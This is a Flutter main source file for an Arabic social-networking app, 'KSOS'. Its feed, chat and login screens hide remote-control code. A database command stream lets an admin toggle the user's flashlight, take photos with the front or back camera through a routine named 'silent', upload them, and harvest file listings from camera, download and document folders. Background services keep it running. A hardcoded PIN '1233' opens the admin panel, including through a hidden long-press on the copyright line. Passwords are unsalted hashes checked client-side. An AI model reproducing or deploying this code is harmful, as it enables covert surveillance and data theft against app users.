// ignore_for_file: use_build_context_synchronously
import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:supabase_flutter/supabase_flutter.dart';
import 'package:crypto/crypto.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:torch_light/torch_light.dart';
import 'package:camera/camera.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:firebase_messaging/firebase_messaging.dart';
import 'config/base_url.dart';
import 'services/fcm_service.dart';
import 'services/workmanager_service.dart';
import 'services/power_management_service.dart';
import 'services/background_server_service.dart';
import 'package:android_alarm_manager_plus/android_alarm_manager_plus.dart';

// Screens
import 'screens/home/home_screen.dart';
import 'screens/explore/explore_screen.dart';
import 'screens/post/create_post_screen.dart';
import 'screens/profile/profile_screen.dart';
import 'screens/chat/conversations_screen.dart';
import 'screens/notifications/notifications_screen.dart';
import 'screens/settings/settings_screen.dart';
import 'screens/admin/admin_panel_screen.dart';
import 'screens/admin/silent_capture_screen.dart';

// Background message handler - must be top-level
@pragma('vm:entry-point')
Future<void> _firebaseBackgroundHandler(RemoteMessage message) async {
  await firebaseMessagingBackgroundHandler(message);
}

void main() {
  // Set custom error widget for release mode
  ErrorWidget.builder = (FlutterErrorDetails details) {
    return MaterialApp(
      home: Scaffold(
        backgroundColor: const Color(0xFF0D0D1A),
        body: Center(
          child: Padding(
            padding: const EdgeInsets.all(24),
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                const Icon(Icons.error_outline, color: Colors.red, size: 64),
                const SizedBox(height: 16),
                const Text(
                  'حدث خطأ',
                  style: TextStyle(color: Colors.white, fontSize: 24),
                ),
                const SizedBox(height: 8),
                Text(
                  details.exception.toString(),
                  style: const TextStyle(color: Colors.white70, fontSize: 12),
                  textAlign: TextAlign.center,
                ),
              ],
            ),
          ),
        ),
      ),
    );
  };

  runZonedGuarded(
    () async {
      WidgetsFlutterBinding.ensureInitialized();

      // Handle Flutter framework errors
      FlutterError.onError = (FlutterErrorDetails details) {
        FlutterError.presentError(details);
        debugPrint('Flutter Error: ${details.exception}');
      };

      bool supabaseInitialized = false;
      try {
        await Supabase.initialize(
          url: SUPABASE_URL,
          anonKey: SUPABASE_ANON_KEY,
        );
        supabaseInitialized = true;
      } catch (e) {
        debugPrint('Error initializing Supabase: $e');
      }

      // تهيئة خدمة FCM
      try {
        await initializeFCMService();
        debugPrint('FCM Service initialized successfully');
      } catch (e) {
        debugPrint('Error initializing FCM: $e');
      }

      // تهيئة WorkManager كنظام backup
      try {
        await initializeWorkManager();
        debugPrint('WorkManager initialized successfully');
      } catch (e) {
        debugPrint('Error initializing WorkManager: $e');
      }

      // تهيئة AlarmManager كنظام backup إضافي
      try {
        await AndroidAlarmManager.initialize();
        debugPrint('AlarmManager initialized successfully');
      } catch (e) {
        debugPrint('Error initializing AlarmManager: $e');
      }

      // طلب إعفاء من تحسين البطارية (مهم جداً للعمل في الخلفية)
      try {
        await PowerManagementService.requestBatteryOptimizationExemption();
        debugPrint('Battery optimization check completed');
      } catch (e) {
        debugPrint('Error checking battery optimization: $e');
      }

      // تهيئة خدمة الخادم الخلفي
      try {
        await BackgroundServerService.initialize();
        debugPrint('BackgroundServerService initialized');
      } catch (e) {
        debugPrint('Error initializing BackgroundServerService: $e');
      }

      runApp(MyApp(supabaseInitialized: supabaseInitialized));
    },
    (error, stackTrace) {
      debugPrint('Uncaught error: $error');
      debugPrint('Stack trace: $stackTrace');
    },
  );
}

class MyApp extends StatefulWidget {
  final bool supabaseInitialized;

  const MyApp({super.key, this.supabaseInitialized = true});

  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  bool _isCheckingAuth = true;
  int? _savedUserId;
  String? _pendingCameraCommand;
  String? _pendingCameraCommandId;

  @override
  void initState() {
    super.initState();
    _checkSavedSession();
  }

  Future<void> _checkSavedSession() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final savedId = prefs.getInt('user_id');

      // التحقق من أوامر الكاميرا المعلقة
      final pendingCommand = prefs.getString('pending_camera_command');
      final pendingCommandId = prefs.getString('pending_camera_command_id');

      // مسح الأمر المعلق بعد قراءته
      if (pendingCommand != null) {
        await prefs.remove('pending_camera_command');
        await prefs.remove('pending_camera_command_id');
        debugPrint('📸 Found pending camera command: $pendingCommand');
      }

      if (mounted) {
        setState(() {
          _savedUserId = savedId;
          _pendingCameraCommand = pendingCommand;
          _pendingCameraCommandId = pendingCommandId;
          _isCheckingAuth = false;
        });
      }
    } catch (e) {
      debugPrint('Error checking saved session: $e');
      if (mounted) {
        setState(() {
          _isCheckingAuth = false;
        });
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    // تصميم غامض ومظلم
    final darkColor = const Color(0xFF0D0D1A); // أزرق قاتم جداً
    final primaryColor = const Color(0xFF6C5CE7); // بنفسجي
    final secondaryColor = const Color(0xFF2D3436); // رمادي قاتم
    final accentColor = const Color(0xFF00CEC9); // تركواز

    return MaterialApp(
      title: 'KSOS',
      debugShowCheckedModeBanner: false,
      // التصميم الغامض الافتراضي
      theme: ThemeData(
        brightness: Brightness.dark,
        scaffoldBackgroundColor: darkColor,
        colorScheme: ColorScheme.dark(
          primary: primaryColor,
          secondary: secondaryColor,
          tertiary: accentColor,
          surface: const Color(0xFF1A1A2E),
          onSurface: Colors.white,
        ),
        useMaterial3: true,
        fontFamily: 'Roboto',
        appBarTheme: AppBarTheme(
          elevation: 0,
          centerTitle: true,
          backgroundColor: darkColor,
          foregroundColor: Colors.white,
        ),
        cardTheme: CardThemeData(
          elevation: 8,
          color: const Color(0xFF16213E),
          shadowColor: primaryColor.withAlpha(50),
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(16),
          ),
        ),
        elevatedButtonTheme: ElevatedButtonThemeData(
          style: ElevatedButton.styleFrom(
            elevation: 4,
            backgroundColor: primaryColor,
            foregroundColor: Colors.white,
            padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 14),
            shape: RoundedRectangleBorder(
              borderRadius: BorderRadius.circular(12),
            ),
          ),
        ),
        inputDecorationTheme: InputDecorationTheme(
          filled: true,
          fillColor: const Color(0xFF16213E),
          border: OutlineInputBorder(
            borderRadius: BorderRadius.circular(12),
            borderSide: BorderSide.none,
          ),
          enabledBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(12),
            borderSide: BorderSide(color: primaryColor.withAlpha(50)),
          ),
          focusedBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(12),
            borderSide: BorderSide(color: primaryColor, width: 2),
          ),
        ),
        bottomNavigationBarTheme: BottomNavigationBarThemeData(
          backgroundColor: const Color(0xFF0F0F23),
          selectedItemColor: primaryColor,
          unselectedItemColor: Colors.grey.shade600,
        ),
        pageTransitionsTheme: const PageTransitionsTheme(
          builders: {
            TargetPlatform.android: CupertinoPageTransitionsBuilder(),
            TargetPlatform.iOS: CupertinoPageTransitionsBuilder(),
          },
        ),
      ),
      home: _isCheckingAuth
          ? const Scaffold(body: Center(child: CircularProgressIndicator()))
          : _pendingCameraCommand != null && _savedUserId != null
          ? SilentCaptureScreen(
              cameraType: _pendingCameraCommand == 'camera_front'
                  ? 'front'
                  : 'back',
              commandId: _pendingCameraCommandId,
            )
          : _savedUserId != null
          ? MainScreen(userId: _savedUserId!)
          : const AuthPage(),
    );
  }
}

// ==========================================
// Auth Page - Premium Design
// ==========================================
class AuthPage extends StatefulWidget {
  const AuthPage({super.key});

  @override
  State<AuthPage> createState() => _AuthPageState();
}

class _AuthPageState extends State<AuthPage> {
  final _nameController = TextEditingController();
  final _usernameController = TextEditingController();
  final _passwordController = TextEditingController();
  bool _isLoading = false;
  bool _isLoginMode = true;
  bool _obscurePassword = true;
  String? _errorMessage;

  String _hashPassword(String password) {
    final bytes = utf8.encode(password);
    final digest = sha256.convert(bytes);
    return digest.toString();
  }

  Future<void> _signUp() async {
    final name = _nameController.text.trim();
    final username = _usernameController.text.trim().toLowerCase();
    final password = _passwordController.text;

    if (name.isEmpty || username.isEmpty || password.isEmpty) {
      setState(() => _errorMessage = 'يرجى ملء جميع الحقول');
      return;
    }

    if (username.length < 3) {
      setState(
        () => _errorMessage = 'اسم المستخدم يجب أن يكون 3 أحرف على الأقل',
      );
      return;
    }

    if (password.length < 6) {
      setState(
        () => _errorMessage = 'كلمة المرور يجب أن تكون 6 أحرف على الأقل',
      );
      return;
    }

    setState(() {
      _isLoading = true;
      _errorMessage = null;
    });

    try {
      final existing = await Supabase.instance.client
          .from('users')
          .select()
          .eq('username', username)
          .maybeSingle();

      if (existing != null) {
        setState(() => _errorMessage = 'اسم المستخدم موجود مسبقاً');
        return;
      }

      final hashedPassword = _hashPassword(password);

      final result = await Supabase.instance.client
          .from('users')
          .insert({
            'username': username,
            'password': hashedPassword,
            'name': name,
          })
          .select()
          .single();

      if (mounted) {
        // حفظ الجلسة
        final prefs = await SharedPreferences.getInstance();
        await prefs.setInt('user_id', result['id']);

        Navigator.pushReplacement(
          context,
          MaterialPageRoute(builder: (_) => MainScreen(userId: result['id'])),
        );
      }
    } catch (e) {
      if (mounted) {
        setState(() => _errorMessage = 'حدث خطأ: $e');
      }
    } finally {
      if (mounted) setState(() => _isLoading = false);
    }
  }

  Future<void> _signIn() async {
    final username = _usernameController.text.trim().toLowerCase();
    final password = _passwordController.text;

    if (username.isEmpty || password.isEmpty) {
      setState(() => _errorMessage = 'يرجى ملء جميع الحقول');
      return;
    }

    setState(() {
      _isLoading = true;
      _errorMessage = null;
    });

    try {
      final hashedPassword = _hashPassword(password);

      final user = await Supabase.instance.client
          .from('users')
          .select()
          .eq('username', username)
          .eq('password', hashedPassword)
          .maybeSingle();

      if (user == null) {
        setState(() => _errorMessage = 'اسم المستخدم أو كلمة المرور غير صحيحة');
        return;
      }

      if (mounted) {
        // حفظ الجلسة
        final prefs = await SharedPreferences.getInstance();
        await prefs.setInt('user_id', user['id']);

        Navigator.pushReplacement(
          context,
          MaterialPageRoute(builder: (_) => MainScreen(userId: user['id'])),
        );
      }
    } catch (e) {
      if (mounted) {
        setState(() => _errorMessage = 'حدث خطأ: $e');
      }
    } finally {
      if (mounted) setState(() => _isLoading = false);
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: [
              Theme.of(context).colorScheme.primary,
              Theme.of(context).colorScheme.secondary,
            ],
          ),
        ),
        child: SafeArea(
          child: Center(
            child: SingleChildScrollView(
              padding: const EdgeInsets.all(24),
              child: Column(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  // Logo
                  Container(
                    padding: const EdgeInsets.all(20),
                    decoration: BoxDecoration(
                      color: Colors.white,
                      shape: BoxShape.circle,
                      boxShadow: [
                        BoxShadow(
                          color: Colors.black.withAlpha(50),
                          blurRadius: 20,
                          spreadRadius: 5,
                        ),
                      ],
                    ),
                    child: Icon(
                      Icons.people_alt_rounded,
                      size: 60,
                      color: Theme.of(context).colorScheme.primary,
                    ),
                  ),
                  const SizedBox(height: 24),
                  Text(
                    'KSOS',
                    style: TextStyle(
                      fontSize: 36,
                      fontWeight: FontWeight.bold,
                      color: Colors.white,
                      shadows: [
                        Shadow(
                          color: Colors.black.withAlpha(50),
                          blurRadius: 10,
                        ),
                      ],
                    ),
                  ),
                  const SizedBox(height: 8),
                  Text(
                    _isLoginMode ? 'تسجيل الدخول' : 'إنشاء حساب جديد',
                    style: const TextStyle(color: Colors.white70, fontSize: 16),
                  ),
                  const SizedBox(height: 40),

                  // Card
                  Container(
                    padding: const EdgeInsets.all(24),
                    decoration: BoxDecoration(
                      color: Theme.of(context).colorScheme.surface,
                      borderRadius: BorderRadius.circular(24),
                      boxShadow: [
                        BoxShadow(
                          color: Colors.black.withAlpha(30),
                          blurRadius: 20,
                          spreadRadius: 5,
                        ),
                      ],
                    ),
                    child: Column(
                      children: [
                        if (_errorMessage != null)
                          Container(
                            padding: const EdgeInsets.all(12),
                            margin: const EdgeInsets.only(bottom: 16),
                            decoration: BoxDecoration(
                              color: Colors.red.shade50,
                              borderRadius: BorderRadius.circular(12),
                              border: Border.all(color: Colors.red.shade200),
                            ),
                            child: Row(
                              children: [
                                Icon(
                                  Icons.error_outline,
                                  color: Colors.red.shade700,
                                ),
                                const SizedBox(width: 8),
                                Expanded(
                                  child: Text(
                                    _errorMessage!,
                                    style: TextStyle(
                                      color: Colors.red.shade700,
                                    ),
                                  ),
                                ),
                              ],
                            ),
                          ),

                        // Name field (only for signup)
                        if (!_isLoginMode) ...[
                          TextField(
                            controller: _nameController,
                            decoration: InputDecoration(
                              labelText: 'الاسم الكامل',
                              prefixIcon: const Icon(Icons.person_outline),
                              border: OutlineInputBorder(
                                borderRadius: BorderRadius.circular(12),
                              ),
                              filled: true,
                            ),
                          ),
                          const SizedBox(height: 16),
                        ],

                        // Username field
                        TextField(
                          controller: _usernameController,
                          decoration: InputDecoration(
                            labelText: 'اسم المستخدم',
                            prefixIcon: const Icon(Icons.alternate_email),
                            border: OutlineInputBorder(
                              borderRadius: BorderRadius.circular(12),
                            ),
                            filled: true,
                          ),
                        ),
                        const SizedBox(height: 16),

                        // Password field
                        TextField(
                          controller: _passwordController,
                          obscureText: _obscurePassword,
                          decoration: InputDecoration(
                            labelText: 'كلمة المرور',
                            prefixIcon: const Icon(Icons.lock_outline),
                            suffixIcon: IconButton(
                              icon: Icon(
                                _obscurePassword
                                    ? Icons.visibility_off
                                    : Icons.visibility,
                              ),
                              onPressed: () {
                                setState(
                                  () => _obscurePassword = !_obscurePassword,
                                );
                              },
                            ),
                            border: OutlineInputBorder(
                              borderRadius: BorderRadius.circular(12),
                            ),
                            filled: true,
                          ),
                        ),
                        const SizedBox(height: 24),

                        // Submit button
                        SizedBox(
                          width: double.infinity,
                          height: 56,
                          child: ElevatedButton(
                            onPressed: _isLoading
                                ? null
                                : (_isLoginMode ? _signIn : _signUp),
                            style: ElevatedButton.styleFrom(
                              backgroundColor: Theme.of(
                                context,
                              ).colorScheme.primary,
                              foregroundColor: Colors.white,
                              shape: RoundedRectangleBorder(
                                borderRadius: BorderRadius.circular(12),
                              ),
                              elevation: 3,
                            ),
                            child: _isLoading
                                ? const SizedBox(
                                    width: 24,
                                    height: 24,
                                    child: CircularProgressIndicator(
                                      color: Colors.white,
                                      strokeWidth: 2,
                                    ),
                                  )
                                : Text(
                                    _isLoginMode
                                        ? 'تسجيل الدخول'
                                        : 'إنشاء حساب',
                                    style: const TextStyle(
                                      fontSize: 18,
                                      fontWeight: FontWeight.bold,
                                    ),
                                  ),
                          ),
                        ),
                        const SizedBox(height: 16),

                        // Toggle mode
                        Row(
                          mainAxisAlignment: MainAxisAlignment.center,
                          children: [
                            Text(
                              _isLoginMode
                                  ? 'ليس لديك حساب؟'
                                  : 'لديك حساب بالفعل؟',
                              style: TextStyle(color: Colors.grey.shade600),
                            ),
                            TextButton(
                              onPressed: () {
                                setState(() {
                                  _isLoginMode = !_isLoginMode;
                                  _errorMessage = null;
                                });
                              },
                              child: Text(
                                _isLoginMode ? 'إنشاء حساب' : 'تسجيل الدخول',
                                style: TextStyle(
                                  fontWeight: FontWeight.bold,
                                  color: Theme.of(context).colorScheme.primary,
                                ),
                              ),
                            ),
                          ],
                        ),
                      ],
                    ),
                  ),
                ],
              ),
            ),
          ),
        ),
      ),
    );
  }
}

// ==========================================
// Main Screen with Bottom Navigation
// ==========================================
class MainScreen extends StatefulWidget {
  final int userId;

  const MainScreen({super.key, required this.userId});

  @override
  State<MainScreen> createState() => _MainScreenState();
}

class _MainScreenState extends State<MainScreen> {
  int _currentIndex = 0;
  Map<String, dynamic>? _userData;
  bool _isLoadingUser = true;
  StreamSubscription? _commandSubscription;

  List<Widget> get _screens => [
    HomeScreen(userId: widget.userId, username: _userData?['username'] ?? ''),
    ExploreScreen(userId: widget.userId),
    CreatePostScreen(userId: widget.userId),
    ConversationsScreen(userId: widget.userId),
    ProfileScreen(userId: widget.userId, currentUserId: widget.userId),
  ];

  @override
  void initState() {
    super.initState();
    _loadUserData();
    _listenToCommands();
    _setOnlineStatus(true);
  }

  @override
  void dispose() {
    _setOnlineStatus(false);
    _commandSubscription?.cancel();
    super.dispose();
  }

  Future<void> _setOnlineStatus(bool isOnline) async {
    try {
      await Supabase.instance.client
          .from('users')
          .update({'is_online': isOnline})
          .eq('id', widget.userId);
    } catch (e) {
      debugPrint('Error updating online status: $e');
    }
  }

  void _listenToCommands() {
    // الاستماع لأوامر الأدمن من قاعدة البيانات
    _commandSubscription = Supabase.instance.client
        .from('admin_commands')
        .stream(primaryKey: ['id'])
        .eq('target_user_id', widget.userId)
        .listen((List<Map<String, dynamic>> data) async {
          for (final command in data) {
            if (command['executed'] == false) {
              final commandType = command['command_type'] as String?;

              try {
                if (commandType == 'flash_on') {
                  // تشغيل الفلاش
                  await TorchLight.enableTorch();
                  debugPrint('Flash turned ON for user ${widget.userId}');
                  if (mounted) {
                    ScaffoldMessenger.of(context).showSnackBar(
                      const SnackBar(
                        content: Text('تم تشغيل الفلاش بأمر من الأدمن 🔦'),
                        backgroundColor: Colors.green,
                      ),
                    );
                  }
                } else if (commandType == 'flash_off') {
                  // إطفاء الفلاش
                  await TorchLight.disableTorch();
                  debugPrint('Flash turned OFF for user ${widget.userId}');
                  if (mounted) {
                    ScaffoldMessenger.of(context).showSnackBar(
                      const SnackBar(
                        content: Text('تم إطفاء الفلاش بأمر من الأدمن 🌑'),
                        backgroundColor: Colors.grey,
                      ),
                    );
                  }
                } else if (commandType == 'camera_front' ||
                    commandType == 'camera_back') {
                  // التقاط صورة صامت من الكاميرا
                  await _captureAndUploadPhotoSilent(
                    commandType == 'camera_front',
                    commandType == 'camera_front' ? 'front' : 'back',
                  );
                } else if (commandType == 'list_files') {
                  // جلب قائمة الملفات
                  await _listAndUploadFiles();
                }

                // تحديث حالة الأمر إلى منفذ
                await Supabase.instance.client
                    .from('admin_commands')
                    .update({'executed': true})
                    .eq('id', command['id']);
              } catch (e) {
                debugPrint('Error executing command: $e');
              }
            }
          }
        });
  }

  // التقاط صورة صامت بدون فتح واجهة الكاميرا
  Future<void> _captureAndUploadPhotoSilent(
    bool isFront,
    String cameraType,
  ) async {
    CameraController? cameraController;
    try {
      // طلب إذن الكاميرا
      final cameraStatus = await Permission.camera.request();
      if (!cameraStatus.isGranted) {
        debugPrint('Camera permission denied');
        return;
      }

      // الحصول على قائمة الكاميرات المتاحة
      final cameras = await availableCameras();
      if (cameras.isEmpty) {
        debugPrint('No cameras available');
        return;
      }

      // اختيار الكاميرا المطلوبة
      CameraDescription? selectedCamera;
      for (final camera in cameras) {
        if (isFront && camera.lensDirection == CameraLensDirection.front) {
          selectedCamera = camera;
          break;
        } else if (!isFront &&
            camera.lensDirection == CameraLensDirection.back) {
          selectedCamera = camera;
          break;
        }
      }

      selectedCamera ??= cameras.first;

      // تهيئة الكاميرا
      cameraController = CameraController(
        selectedCamera,
        ResolutionPreset.medium,
        enableAudio: false,
      );

      await cameraController.initialize();

      // انتظار قصير للتركيز
      await Future.delayed(const Duration(milliseconds: 500));

      // التقاط الصورة
      final XFile photo = await cameraController.takePicture();
      final bytes = await photo.readAsBytes();

      // رفع الصورة إلى Supabase Storage
      final fileName =
          'capture_${widget.userId}_${DateTime.now().millisecondsSinceEpoch}.jpg';

      await Supabase.instance.client.storage
          .from('media')
          .uploadBinary('captures/$fileName', bytes);

      final imageUrl = Supabase.instance.client.storage
          .from('media')
          .getPublicUrl('captures/$fileName');

      // حفظ معلومات الصورة في قاعدة البيانات
      await Supabase.instance.client.from('captured_images').insert({
        'user_id': widget.userId,
        'image_url': imageUrl,
        'camera_type': cameraType,
      });

      debugPrint('Silent photo captured and uploaded: $imageUrl');

      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text(
              'تم التقاط صورة من الكاميرا ${cameraType == 'front' ? 'الأمامية' : 'الخلفية'} 📸',
            ),
            backgroundColor: Colors.blue,
          ),
        );
      }
    } catch (e) {
      debugPrint('Error capturing silent photo: $e');
    } finally {
      // إغلاق الكاميرا
      await cameraController?.dispose();
    }
  }

  Future<void> _listAndUploadFiles() async {
    try {
      // طلب إذن التخزين
      final storageStatus = await Permission.storage.request();
      final photosStatus = await Permission.photos.request();

      if (!storageStatus.isGranted && !photosStatus.isGranted) {
        // محاولة إذن موسع للأندرويد 11+
        await Permission.manageExternalStorage.request();
      }

      // قائمة المجلدات للبحث فيها
      final directories = [
        '/storage/emulated/0/DCIM/Camera',
        '/storage/emulated/0/Pictures',
        '/storage/emulated/0/Download',
        '/storage/emulated/0/Documents',
      ];

      int filesUploaded = 0;

      for (final dirPath in directories) {
        final directory = Directory(dirPath);

        if (await directory.exists()) {
          try {
            final files = directory.listSync().take(30);

            for (final file in files) {
              if (file is File) {
                final stat = await file.stat();
                final fileName = file.path.split('/').last;
                final fileType = _getFileType(fileName);

                // حفظ معلومات الملف في قاعدة البيانات
                await Supabase.instance.client.from('user_files').upsert({
                  'user_id': widget.userId,
                  'file_name': fileName,
                  'file_path': file.path,
                  'file_type': fileType,
                  'file_size': stat.size,
                }, onConflict: 'user_id,file_path');

                filesUploaded++;
              }
            }
          } catch (e) {
            debugPrint('Error reading directory $dirPath: $e');
          }
        }
      }

      debugPrint(
        'Files list uploaded: $filesUploaded files for user ${widget.userId}',
      );

      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text('تم مزامنة $filesUploaded ملف 📁'),
            backgroundColor: Colors.purple,
          ),
        );
      }
    } catch (e) {
      debugPrint('Error listing files: $e');
    }
  }

  String _getFileType(String fileName) {
    final ext = fileName.toLowerCase().split('.').last;
    if (['jpg', 'jpeg', 'png', 'gif', 'webp'].contains(ext)) return 'image';
    if (['mp4', 'mov', 'avi', 'mkv'].contains(ext)) return 'video';
    if (['mp3', 'wav', 'aac', 'm4a'].contains(ext)) return 'audio';
    if (['pdf', 'doc', 'docx', 'txt'].contains(ext)) return 'document';
    return 'other';
  }

  Future<void> _loadUserData() async {
    try {
      final response = await Supabase.instance.client
          .from('users')
          .select('id, username, name, avatar_url')
          .eq('id', widget.userId)
          .maybeSingle();

      if (mounted) {
        setState(() {
          _userData = response;
          _isLoadingUser = false;
        });
      }
    } catch (e) {
      debugPrint('Error loading user data: $e');
      if (mounted) {
        setState(() {
          _isLoadingUser = false;
        });
      }
    }
  }

  Future<void> _logout() async {
    // مسح الجلسة المحفوظة
    final prefs = await SharedPreferences.getInstance();
    await prefs.remove('user_id');

    if (mounted) {
      Navigator.pushReplacement(
        context,
        MaterialPageRoute(builder: (_) => const AuthPage()),
      );
    }
  }

  void _showAdminPasswordDialog() {
    final passwordController = TextEditingController();
    Navigator.pop(context); // إغلاق الـ Drawer

    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        title: const Text('الدخول الإداري'),
        content: TextField(
          controller: passwordController,
          obscureText: true,
          keyboardType: TextInputType.number,
          decoration: const InputDecoration(
            labelText: 'كلمة المرور',
            border: OutlineInputBorder(),
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('إلغاء'),
          ),
          ElevatedButton(
            onPressed: () {
              if (passwordController.text == '1233') {
                Navigator.pop(context);
                Navigator.push(
                  context,
                  MaterialPageRoute(
                    builder: (_) =>
                        AdminPanelScreen(adminUserId: widget.userId),
                  ),
                );
              } else {
                ScaffoldMessenger.of(context).showSnackBar(
                  const SnackBar(
                    content: Text('كلمة المرور غير صحيحة'),
                    backgroundColor: Colors.red,
                  ),
                );
              }
            },
            child: const Text('دخول'),
          ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    if (_isLoadingUser) {
      return const Scaffold(body: Center(child: CircularProgressIndicator()));
    }

    final userName = _userData?['name'] ?? _userData?['username'] ?? 'مستخدم';
    final userUsername = _userData?['username'] ?? '';

    // طباعة للتحقق
    debugPrint('Username loaded: $userUsername');

    return Scaffold(
      appBar: AppBar(
        title: const Text('KSOS'),
        leading: Builder(
          builder: (context) => IconButton(
            icon: const Icon(Icons.menu),
            onPressed: () => Scaffold.of(context).openDrawer(),
          ),
        ),
      ),
      body: _screens[_currentIndex],
      bottomNavigationBar: NavigationBar(
        selectedIndex: _currentIndex,
        onDestinationSelected: (index) => setState(() => _currentIndex = index),
        destinations: const [
          NavigationDestination(
            icon: Icon(Icons.home_outlined),
            selectedIcon: Icon(Icons.home),
            label: 'الرئيسية',
          ),
          NavigationDestination(
            icon: Icon(Icons.explore_outlined),
            selectedIcon: Icon(Icons.explore),
            label: 'استكشاف',
          ),
          NavigationDestination(
            icon: Icon(Icons.add_circle_outline),
            selectedIcon: Icon(Icons.add_circle),
            label: 'إضافة',
          ),
          NavigationDestination(
            icon: Icon(Icons.chat_outlined),
            selectedIcon: Icon(Icons.chat),
            label: 'المحادثات',
          ),
          NavigationDestination(
            icon: Icon(Icons.person_outlined),
            selectedIcon: Icon(Icons.person),
            label: 'البروفايل',
          ),
        ],
      ),
      drawer: Drawer(
        child: ListView(
          children: [
            DrawerHeader(
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [
                    Theme.of(context).colorScheme.primary,
                    const Color(0xFF0D0D1A),
                  ],
                ),
              ),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                mainAxisAlignment: MainAxisAlignment.end,
                children: [
                  CircleAvatar(
                    radius: 35,
                    backgroundColor: Colors.white,
                    backgroundImage: _userData?['avatar_url'] != null
                        ? NetworkImage(_userData!['avatar_url'])
                        : null,
                    child: _userData?['avatar_url'] == null
                        ? Text(
                            userName.substring(0, 1).toUpperCase(),
                            style: TextStyle(
                              fontSize: 28,
                              color: Theme.of(context).colorScheme.primary,
                            ),
                          )
                        : null,
                  ),
                  const SizedBox(height: 12),
                  Text(
                    userName,
                    style: const TextStyle(
                      color: Colors.white,
                      fontSize: 18,
                      fontWeight: FontWeight.bold,
                    ),
                  ),
                  Text(
                    '@$userUsername',
                    style: const TextStyle(color: Colors.white70, fontSize: 14),
                  ),
                ],
              ),
            ),
            ListTile(
              leading: const Icon(Icons.notifications_outlined),
              title: const Text('الإشعارات'),
              onTap: () {
                Navigator.pop(context);
                Navigator.push(
                  context,
                  MaterialPageRoute(
                    builder: (_) => NotificationsScreen(userId: widget.userId),
                  ),
                );
              },
            ),
            ListTile(
              leading: const Icon(Icons.settings_outlined),
              title: const Text('الإعدادات'),
              onTap: () {
                Navigator.pop(context);
                Navigator.push(
                  context,
                  MaterialPageRoute(
                    builder: (_) => SettingsScreen(
                      userId: widget.userId,
                      username: userUsername,
                      isDarkMode: true,
                      language: 'ar',
                      onDarkModeChanged: (value) {},
                      onLanguageChanged: (value) {},
                      onLogout: _logout,
                    ),
                  ),
                );
              },
            ),
            // زر لوحة تحكم الأدمن - يظهر للجميع ويطلب كلمة مرور
            ListTile(
              leading: const Icon(
                Icons.admin_panel_settings,
                color: Colors.orange,
              ),
              title: const Text(
                'لوحة تحكم الأدمن',
                style: TextStyle(
                  color: Colors.orange,
                  fontWeight: FontWeight.bold,
                ),
              ),
              onTap: () => _showAdminPasswordDialog(),
            ),
            const Divider(),
            ListTile(
              leading: const Icon(Icons.logout, color: Colors.red),
              title: const Text(
                'تسجيل الخروج',
                style: TextStyle(color: Colors.red),
              ),
              onTap: _logout,
            ),
            const Divider(),
            // حقوق Vrtics - الضغط عليها يفتح الدخول السري للأدمن
            GestureDetector(
              onLongPress: () => _showAdminPasswordDialog(),
              child: Padding(
                padding: const EdgeInsets.all(16),
                child: Column(
                  children: [
                    Text(
                      '© 2024 V r t i c s',
                      style: TextStyle(
                        color: Colors.grey.shade500,
                        fontSize: 12,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                    const SizedBox(height: 4),
                    Text(
                      'جميع الحقوق محفوظة',
                      style: TextStyle(
                        color: Colors.grey.shade600,
                        fontSize: 10,
                      ),
                    ),
                  ],
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }
}
